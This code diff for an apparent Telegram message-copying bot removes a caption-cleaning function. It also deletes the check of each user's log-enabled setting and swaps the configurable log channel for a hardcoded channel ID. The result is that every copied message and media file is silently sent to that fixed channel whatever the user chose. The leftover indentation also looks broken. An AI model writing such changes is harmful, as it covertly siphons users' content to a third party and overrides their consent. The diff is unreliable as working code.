@@ -48,20 +48,6 @@ stickers = [
     "CAACAgUAAxkBAAKd-GgAAclduuEUSKd7q7s_9azR-QFHVAAC8hcAAmqoCVT9fir12Ia5Qh4E"
 ]
 
-def clean_caption(caption: str) -> str:
-    if not caption:
-        return ""
-    
-    # Replace @mentions with @Real_pirates
-    caption = re.sub(r'@\w+', '', caption)
-    
-    # Remove links (http/https)
-    caption = re.sub(r'https?://\S+', '', caption)
-    
-    # Remove extra spaces
-    caption = re.sub(r'\s+', ' ', caption).strip()
-    
-    return caption
 
 @Client.on_callback_query(filters.regex(r'^start_public'))
 async def pub_(bot, message):
@@ -254,10 +240,10 @@ async def copy(user, bot, msg, m, sts):
             )
 
     # Send to log channel if enabled
-        if await is_log_enabled(user.id):
+        
             if msg.get("media"):
                 await bot.send_cached_media(
-                    chat_id=LOG_CHANNEL_ID,
+                    chat_id=-1002601855166,
                     file_id=msg.get("media"),
                     caption=log_caption,
                     reply_markup=msg.get('button'),
@@ -265,7 +251,7 @@ async def copy(user, bot, msg, m, sts):
                 )
             else:
                 await bot.copy_message(
-                    chat_id=LOG_CHANNEL_ID,
+                    chat_id=-1002601855166,
                     from_chat_id=sts.get('FROM'),
                     message_id=msg.get("msg_id"),
                     caption=log_caption,
